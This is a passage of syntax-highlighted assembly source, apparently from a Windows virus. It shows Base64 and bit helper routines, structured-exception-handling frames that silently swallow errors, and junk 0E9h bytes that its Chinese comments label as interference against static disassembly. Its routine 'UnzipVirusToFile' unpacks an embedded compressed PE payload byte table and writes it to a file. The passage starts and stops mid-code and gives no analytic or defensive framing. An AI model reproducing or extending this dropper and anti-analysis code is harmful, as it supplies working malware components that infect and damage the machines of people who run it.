    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">nBase64Size</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0"> 
</span><span class="sc5">AnsiToBase64</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;AnsiToBase64子程序，得到一位的值</span><span class="sc0">
</span><span class="sc5">GetBit</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">uses</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">SrcStr</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc4">,</span><span class="sc5">nCx</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">SrcStr</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">nCx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc0">
    </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0"> 
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">GetBit</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">
    
</span><span class="sc5">SetSehFrame</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc1">;ecx=忽略错误继续执行地址</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">;弹出返回地址</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">     </span><span class="sc1">;保存忽略错误继续执行地址</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushExceptionProc</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Exception</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0e9h</span><span class="sc0">        </span><span class="sc1">;静态反汇编干扰</span><span class="sc0">
</span><span class="sc5">PushExceptionProc</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">fs</span><span class="sc4">:</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetSaveEspAddr</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;保存以前的Esp值</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">esp</span><span class="sc0">   </span><span class="sc1">;保存现在的Esp值</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0e9h</span><span class="sc0">        </span><span class="sc1">;静态反汇编干扰</span><span class="sc0">

</span><span class="sc5">ClearSehFrame</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">;弹出返回地址</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetSaveEspAddr</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;恢复Esp值</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;恢复原来的Esp值</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">     </span><span class="sc1">;弹出忽略错误继续执行地址</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0e9h</span><span class="sc0">        </span><span class="sc1">;静态反汇编干扰</span><span class="sc0">

</span><span class="sc5">GetSaveEspAddr</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushOffsetSaveEspAddr</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">PushOffsetSaveEspAddr</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0e9h</span><span class="sc0">        </span><span class="sc1">;静态反汇编干扰</span><span class="sc0">

</span><span class="sc5">Exception</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc5">pRecord</span><span class="sc4">,</span><span class="sc5">pFrame</span><span class="sc4">,</span><span class="sc5">pContext</span><span class="sc4">,</span><span class="sc5">pDispatch</span><span class="sc0">    
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PushSehBackProc</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ClearSehFrame</span><span class="sc0">   </span><span class="sc1">;自动清除意外Seh</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0e9h</span><span class="sc0">        </span><span class="sc1">;静态反汇编干扰</span><span class="sc0">
</span><span class="sc5">PushSehBackProc</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">pContext</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">eax.cx_Eip</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">;忽略错误继续执行</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Exception</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">UnzipVirusToFile</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc1">;ebx=hFile</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetVirusZipData</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">04Dh</span><span class="sc4">,</span><span class="sc2">05Ah</span><span class="sc4">,</span><span class="sc2">050h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc2">004h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc2">00Fh</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc2">0B8h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">007h</span><span class="sc4">,</span><span class="sc2">040h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc2">01Ah</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">022h</span><span class="sc4">,</span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc2">0BAh</span><span class="sc4">,</span><span class="sc2">010h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc2">00Eh</span><span class="sc4">,</span><span class="sc2">01Fh</span><span class="sc4">,</span><span class="sc2">0B4h</span><span class="sc4">,</span><span class="sc2">009h</span><span class="sc4">,</span><span class="sc2">0CDh</span><span class="sc4">,</span><span class="sc2">021h</span><span class="sc4">,</span><span class="sc2">0B8h</span><span class="sc4">,</span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc2">04Ch</span><span class="sc4">,</span><span class="sc2">0CDh</span><span class="sc4">,</span><span class="sc2">021h</span><span class="sc4">,</span><span class="sc2">090h</span><span class="sc4">,</span><span class="sc2">090h</span><span class="sc4">,</span><span class="sc2">054h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">068h</span><span class="sc4">,</span><span class="sc2">069h</span><span class="sc4">,</span><span class="sc2">073h</span><span class="sc4">,</span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc2">070h</span><span class="sc4">,</span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc2">06Fh</span><span class="sc4">,</span><span class="sc2">067h</span><span class="sc4">,</span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc2">061h</span><span class="sc4">,</span><span class="sc2">06Dh</span><span class="sc4">,</span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc2">06Dh</span><span class="sc4">,</span><span class="sc2">075h</span><span class="sc4">,</span><span class="sc2">073h</span><span class="sc4">,</span><span class="sc2">074h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc2">062h</span><span class="sc4">,</span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc2">075h</span><span class="sc4">,</span><span class="sc2">06Eh</span><span class="sc4">,</span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc2">075h</span><span class="sc4">,</span><span class="sc2">06Eh</span><span class="sc4">,</span><span class="sc2">064h</span><span class="sc4">,</span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc2">057h</span><span class="sc4">,</span><span class="sc2">069h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">06Eh</span><span class="sc4">,</span><span class="sc2">033h</span><span class="sc4">,</span><span class="sc2">032h</span><span class="sc4">,</span><span class="sc2">00Dh</span><span class="sc4">,</span><span class="sc2">00Ah</span><span class="sc4">,</span><span class="sc2">024h</span><span class="sc4">,</span><span class="sc2">037h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">088h</span><span class="sc4">,</span><span class="sc2">050h</span><span class="sc4">,</span><span class="sc2">045h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc2">04Ch</span><span class="sc4">,</span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc2">004h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc2">0B5h</span><span class="sc4">,</span><span class="sc2">02Ch</span><span class="sc4">,</span><span class="sc2">0EFh</span><span class="sc4">,</span><span class="sc2">082h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">008h</span><span class="sc4">,</span><span class="sc2">0E0h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc2">08Eh</span><span class="sc4">,</span><span class="sc2">081h</span><span class="sc4">,</span><span class="sc2">00Bh</span><span class="sc4">,</span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc2">002h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">019h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc2">006h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">007h</span><span class="sc4">,</span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc2">020h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">004h</span><span class="sc4">,</span><span class="sc2">040h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">007h</span><span class="sc4">,</span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc2">00Ah</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">006h</span><span class="sc4">,</span><span class="sc2">050h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc2">004h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">006h</span><span class="sc4">,</span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">005h</span><span class="sc4">,</span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">002h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">004h</span><span class="sc4">,</span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">006h</span><span class="sc4">,</span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">00Ch</span><span class="sc4">,</span><span class="sc2">030h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc2">04Eh</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">01Ch</span><span class="sc4">,</span><span class="sc2">040h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc2">00Ch</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">053h</span><span class="sc4">,</span><span class="sc2">043h</span><span class="sc4">,</span><span class="sc2">04Fh</span><span class="sc4">,</span><span class="sc2">044h</span><span class="sc4">,</span><span class="sc2">045h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">005h</span><span class="sc4">,</span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc2">006h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">00Eh</span><span class="sc4">,</span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc2">060h</span><span class="sc4">,</span><span class="sc2">044h</span><span class="sc4">,</span><span class="sc2">041h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">054h</span><span class="sc4">,</span><span class="sc2">041h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">005h</span><span class="sc4">,</span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc2">008h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">00Eh</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">040h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc4">,</span><span class="sc2">02Eh</span><span class="sc4">,</span><span class="sc2">069h</span><span class="sc4">,</span><span class="sc2">064h</span><span class="sc4">,</span><span class="sc2">061h</span><span class="sc4">,</span><span class="sc2">074h</span><span class="sc4">,</span><span class="sc2">061h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc2">030h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc2">00Ah</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">00Eh</span><span class="sc4">,</span><span class="sc2">040h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc4">,</span><span class="sc2">02Eh</span><span class="sc4">,</span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc2">06Ch</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">06Fh</span><span class="sc4">,</span><span class="sc2">063h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc2">040h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc2">00Ch</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">00Eh</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">040h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc2">050h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">06Bh</span><span class="sc4">,</span><span class="sc2">0C3h</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc2">025h</span><span class="sc4">,</span><span class="sc2">030h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">030h</span><span class="sc4">,</span><span class="sc2">040h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">0FDh</span><span class="sc4">,</span><span class="sc2">028h</span><span class="sc4">,</span><span class="sc2">030h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">00Ah</span><span class="sc4">,</span><span class="sc2">038h</span><span class="sc4">,</span><span class="sc2">030h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc2">030h</span><span class="sc4">,</span><span class="sc2">030h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">016h</span><span class="sc4">,</span><span class="sc2">046h</span><span class="sc4">,</span><span class="sc2">030h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">006h</span><span class="sc4">,</span><span class="sc2">046h</span><span class="sc4">,</span><span class="sc2">030h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">006h</span><span class="sc4">,</span><span class="sc2">04Bh</span><span class="sc4">,</span><span class="sc2">045h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">052h</span><span class="sc4">,</span><span class="sc2">04Eh</span><span class="sc4">,</span><span class="sc2">045h</span><span class="sc4">,</span><span class="sc2">04Ch</span><span class="sc4">,</span><span class="sc2">033h</span><span class="sc4">,</span><span class="sc2">032h</span><span class="sc4">,</span><span class="sc2">02Eh</span><span class="sc4">,</span><span class="sc2">064h</span><span class="sc4">,</span><span class="sc2">06Ch</span><span class="sc4">,</span><span class="sc2">06Ch</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">004h</span><span class="sc4">,</span><span class="sc2">053h</span><span class="sc4">,</span><span class="sc2">06Ch</span><span class="sc4">,</span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc2">065h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">070h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">0B5h</span><span class="sc4">,</span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc2">00Ch</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc2">030h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">0F9h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc0">
</span><span class="sc5">GetVirusZipData</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">     </span><span class="sc1">;得到压缩后的PE文件数据</span><span class="sc0">
</span><span class="sc5">ContUnZipVirus</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">WriteVirusSomeBytes</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">esi.KnlLWrite</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">01</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">ContUnZipVirus</span><span class="sc0">
</span><span class="sc5">WriteVirusSomeBytes</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">UnzipVirusEnd</span><span class="sc0">   </span><span class="sc1">;持续解压，直到遇到双0</span><span class="sc0">
</span><span class="sc5">ContWriteVirusBytes</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
